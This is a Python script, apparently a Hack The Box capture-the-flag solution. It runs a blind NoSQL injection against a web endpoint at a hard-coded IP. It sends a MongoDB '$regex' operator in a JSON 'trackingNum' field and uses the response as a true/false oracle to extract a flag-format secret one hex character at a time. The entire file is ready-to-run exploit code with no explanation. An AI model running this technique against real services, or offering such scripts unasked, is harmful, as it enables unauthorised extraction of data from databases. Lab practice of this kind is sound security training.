#!/usr/bin/python3

import requests
import json
import time

# Oracle
def oracle(t):
    try:
        r = requests.post(
            "http://94.237.59.180:44877/index.php",
            headers = {
                "Content-Type": "application/json",
                "Host": "94.237.59.180:44877",
                "Origin": "http://94.237.59.180:44877",
                "Referer": "http://94.237.59.180:44877/"
            },
            data = json.dumps({"trackingNum": t}),
            timeout=5
        )
        return "bmdyy" in r.text
    except requests.exceptions.RequestException as e:
        print(f"\nError: {e}")
        time.sleep(2)
        return False

# Progress display
def print_progress(current, total, found):
    print(f"\rProgress: [{current}/{total}] Found: {found}", end="", flush=True)

print("Testing oracle functionality...")

# Make sure the oracle is functioning correctly
try:
    assert (oracle("X") == False), "Invalid input test failed"
    assert (oracle({"$regex": "^HTB{.*"}) == True), "Valid pattern test failed"
    print("Oracle tests passed!")
except AssertionError as e:
    print(f"Test failed: {e}")
    exit(1)

# Dump the tracking number
print("\nStarting extraction...")
trackingNum = "HTB{" # Tracking number is known to start with 'HTB{'

# Extract the flag
try:
    for i in range(32): # Repeat the following 32 times
        for c in "0123456789abcdef": # Loop through characters [0-9a-f]
            print_progress(i+1, 32, trackingNum + c)
            
            if oracle({"$regex": "^" + trackingNum + c}): # Check if <trackingNum> + <char> matches with $regex
                trackingNum += c # If it does, append character to trackingNum ...
                print(f"\nFound character: {trackingNum}")
                break # ... and break out of the loop
            
            time.sleep(0.1)  # Rate limiting
            
    trackingNum += "}" # Append known '}' to end of tracking number

    # Make sure the tracking number is correct
    assert (oracle(trackingNum) == True), "Final verification failed"

    print("\nSuccess! Tracking Number:", trackingNum)

except KeyboardInterrupt:
    print("\nOperation interrupted by user")
except Exception as e:
    print(f"\nAn error occurred: {e}")
finally:
    # Save the result
    with open("tracking_number.txt", "w") as f:
        f.write(trackingNum)
    print(f"Result saved to tracking_number.txt")